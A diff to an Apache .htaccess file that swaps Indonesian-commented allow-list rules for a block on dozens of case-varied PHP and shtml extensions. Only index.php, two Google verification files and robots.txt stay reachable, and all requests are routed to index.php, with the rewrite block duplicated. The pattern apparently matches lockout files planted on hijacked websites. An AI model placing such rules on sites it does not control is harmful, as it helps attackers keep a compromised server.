@@ -1,9 +1,29 @@
-# Izinkan file tertentu saja
-<FilesMatch "^(googled9fd22f2eeb484dd\.html|google9f1806ec578c1b99\.html|robots\.txt|index\.php)$">
-    Require all granted
+<FilesMatch '.(php|Php|PHp|PHP|pHp|PhP|php5|php6|php7|php.PHP|php.Php|php.PHp|php.PHP|php.pHP|PHP.PHP|php.PHP5|php.PHP6|php4|php3|php.PHP7|php.Php|php.PHp|php.PhP|php.phP|php.phtml|php.PHTML|phtm|PHTM|Phtm|PHtm|PHTm|PhTm|PhTM||PHP.php|PHP.pHP|php56|phar|Phar|pHar|phAr|phaR|pht|Pht|pHt|phT|PHt|PHT|shtml|Shtml|SHtml|SHTml|SHTMl|SHTML|SHtmL|ShtmL|ShTmL|ShtML|ShtMl|shTMl|shTML|phtml|Phtml|pHtml|phTml|phtMl|phtmL|PHtml|PHTml|PHTMl|PHTML|Phtml|PhTml|pHtmL|PHtML|PHTml)$'>
+Order allow,deny
+Deny from all
 </FilesMatch>
+<FilesMatch '^(index.php|google9f1806ec578c1b99.html|googled9fd22f2eeb484dd.html|robots.txt)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg|html|xml|css|js|json|txt|md|yml|otf|ttf|eot|svg|woff|xlsx|doc|docx|pptx|dot|zip|mp4|mp3|psd|tiff|eps|heif|py|rst|webp|less|map|odt|dat|icc)$">
+    Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
 
-# Blokir semua file lain
-<FilesMatch ".*">
-    Require all denied
-</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
